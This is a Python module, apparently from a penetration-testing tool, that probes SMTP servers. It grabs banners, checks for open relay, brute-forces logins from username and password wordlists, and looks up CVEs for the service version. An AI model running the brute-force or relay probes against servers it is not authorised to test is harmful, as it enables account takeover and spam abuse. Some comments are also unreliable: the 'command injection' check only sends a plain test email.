import os
import smtplib
from socket import socket, AF_INET, SOCK_STREAM, gaierror
import requests
from email.mime.text import MIMEText
from src.configs import printt


def banner_grab_smtp(ip, port):
    # Grab the SMTP banner to check the version
    try:
        sock = socket(AF_INET, SOCK_STREAM)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode()
        sock.close()
        print(f"SMTP Banner on port {port}: {banner}")
        return banner
    except Exception as e:
        print(f"[\033[31m!\033[0m] Failed to grab SMTP banner: {e}")
        return None

def check_open_relay(ip, port):
    # Check if the SMTP server is an open relay (allows unauthenticated email sending)
    try:
        with smtplib.SMTP(ip, port) as server:
            server.ehlo()
            response = server.docmd("MAIL FROM:<test@test.com>")
            response2 = server.docmd("RCPT TO:<victim@target.com>")
            if response[0] == 250 and response2[0] == 250:
                print("Warning: Open relay detected!")
            else:
                print("SMTP server is not an open relay.")
    except Exception as e:
        print(f"[\033[31m!\033[0m] Open relay test failed: {e}")

def brute_force_smtp(ip, port, username_file, password_file):
    # Brute-force login attempts using smtplib
    print(f"Starting brute force attack on SMTP server at {ip}:{port}...")
    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying {username}:{password}...")
                with smtplib.SMTP(ip, port) as server:
                    server.ehlo()
                    server.login(username, password)
                    print(f"[\033[32m+\033[0m] Login successful with {username}:{password}")
                    return True
            except smtplib.SMTPAuthenticationError:
                # Login failed, continue trying
                pass
            except Exception as e:
                print(f"[\033[31m!\033[0m] Error occurred during brute-force attempt: {e}")
                return False
    print("Brute-force attack finished, no valid credentials found.")
    return False

def smtp_info(ip,port):
    # Gather IP and scan for SMTP vulnerabilities
    
    if True:
        # Grab the SMTP banner
        banner_grab_smtp(ip, port)
        
        # Check for open relay vulnerability
        check_open_relay(ip, port)
        
        # Brute force login attempt
        username_file = 'usernames.txt'
        password_file = 'passwords.txt'
        brute_force_smtp(ip, port, username_file, password_file)
    else:
        print("[\033[31m!\033[0m] SMTP service not detected or ports 25, 465, and 587 are closed.")


def check_smtp_vulnerability(ip, port, service_version):
    try:
        # Connect to the SMTP server
        server = smtplib.SMTP(ip, port, timeout=10)
        server.set_debuglevel(0)  # Set to 1 for debug output

        # Send HELO command
        response = server.helo()
        print(f"HELO Response: {response}")

        # Send EHLO command
        response = server.ehlo()
        print(f"EHLO Response: {response}")

        # Check for potential vulnerabilities
        check_vulnerability(server)

        # Check for known vulnerabilities using NVD and CVE
        print("Checking known vulnerabilities...")
        check_known_vulnerabilities(service_version)

    except (gaierror, ConnectionRefusedError, TimeoutError) as e:
        print(f"[\033[31m!\033[0m] Failed to connect to SMTP server: {e}")
    except Exception as e:
        print(f"[\033[31m!\033[0m] An error occurred: {e}")
    finally:
        server.quit()

def check_vulnerability(server):
    # Check for potential command injection vulnerability
    try:
        # Attempt to send an email with a potentially dangerous command
        msg = MIMEText("Test")
        msg["From"] = "test@example.com"
        msg["To"] = "test@example.com"
        msg["Subject"] = "Vulnerability Test"
        server.sendmail("test@example.com", "test@example.com", msg.as_string())
        print("SMTP server seems to accept email sending. This could be a potential vector.")
    except smtplib.SMTPRecipientsRefused as e:
        print(f"[\033[31m!\033[0m] Recipient refused: {e}")
    except smtplib.SMTPHeloError as e:
        print(f"[\033[31m!\033[0m] HELO Error: {e}")
    except smtplib.SMTPDataError as e:
        print(f"[\033[31m!\033[0m] Data Error: {e}")
    except smtplib.SMTPException as e:
        print(f"[\033[31m!\033[0m] SMTP Exception: {e}")

def check_known_vulnerabilities(service_version):
    # Define API endpoints for NVD and CVE
    nvd_api_url = "https://services.nvd.nist.gov/rest/json/cves/1.0"
    cve_api_url = "https://cve.circl.lu/api/cve"
    
    # Example NVD query
    try:
        response = requests.get(f"{nvd_api_url}?keyword={service_version}")
        if response.status_code == 200:
            data = response.json()
            for item in data.get("result", {}).get("CVE_Items", []):
                cve_id = item.get("cve", {}).get("CVE_data_meta", {}).get("ID", "N/A")
                description = item.get("cve", {}).get("description", {}).get("description_data", [{}])[0].get("value", "No description")
                print(f"NVD CVE ID: {cve_id}")
                print(f"Description: {description}")
        else:
            print("[\033[31m!\033[0m] Failed to retrieve data from NVD.")
    
    except requests.RequestException as e:
        print(f"[\033[31m!\033[0m] Error querying NVD: {e}")

    # Example CVE query
    try:
        response = requests.get(f"{cve_api_url}/{service_version}")
        if response.status_code == 200:
            data = response.json()
            for item in data:
                cve_id = item.get("id", "N/A")
                description = item.get("summary", "No description")
                print(f"CVE ID: {cve_id}")
                print(f"Description: {description}")
        else:
            print("[\033[31m!\033[0m] Failed to retrieve data from CVE.")
    
    except requests.RequestException as e:
        print(f"[\033[31m!\033[0m] Error querying CVE: {e}")


def smtp(target,p,v):
    smtp_info(target,p)
    check_smtp_vulnerability(target,p,v)